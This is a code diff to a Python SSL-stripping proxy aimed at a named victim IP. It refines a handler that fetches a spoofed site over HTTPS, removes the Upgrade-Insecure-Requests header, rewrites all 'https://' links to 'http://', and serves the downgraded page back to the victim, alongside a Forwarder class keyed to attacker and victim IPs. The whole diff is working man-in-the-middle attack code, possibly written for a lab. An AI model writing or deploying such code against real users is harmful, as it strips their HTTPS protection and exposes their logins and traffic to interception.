@@ -12,6 +12,8 @@ ip_attacker = None
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def __init__(self, *args, **kwargs):
+        self.s = requests.Session()
+        self.s.max_redirects = 30
         super().__init__(*args, **kwargs)
 
     def do_GET(self):
@@ -22,16 +24,33 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         if client_ip == ip_victim:
             # Print request path and headers
             print("Received GET request")
-            print("Path:", self.path)
-            print("Headers:", self.headers)
 
-            response = requests.get("https://" + site_to_spoof + self.path, headers=self.headers)
+            # Remove the Upgrade-Insecure-Requests header
+            new_headers = {key: value for key, value in self.headers.items()}
+            new_headers.pop("Upgrade-Insecure-Requests", None)
+
+            print("Path:", self.path)
+            print("Headers:", new_headers)
+            print("FULL URL: ", "https://" + site_to_spoof + self.path)
+
+            response = self.s.get("https://" + site_to_spoof + self.path, headers=new_headers)
 
             # Replace all "https://" with "http://"
-            response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
+            try:
+                response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
+                print(response.content.decode('utf-8'))
+            except UnicodeDecodeError:
+                response_content = response.content.replace(b"https://", b"http://")
 
             # Send the response back to the client
             self.send_response(response.status_code)
+            # copy headers from the response
+            # for header, value in response.headers.items():
+            #     # Replace https with http in the headers.
+            #     value = value.replace("https://", "http://")
+            #     self.send_header(header, value)
+            #     print("Key:", header, "Value:", value)
+
             self.end_headers()
             self.wfile.write(response_content)
         else:
@@ -39,7 +58,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(403)
             self.end_headers()
             self.wfile.write(b'403 Forbidden: Access denied')
-        super().do_GET()
 
 class Forwarder:
     def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
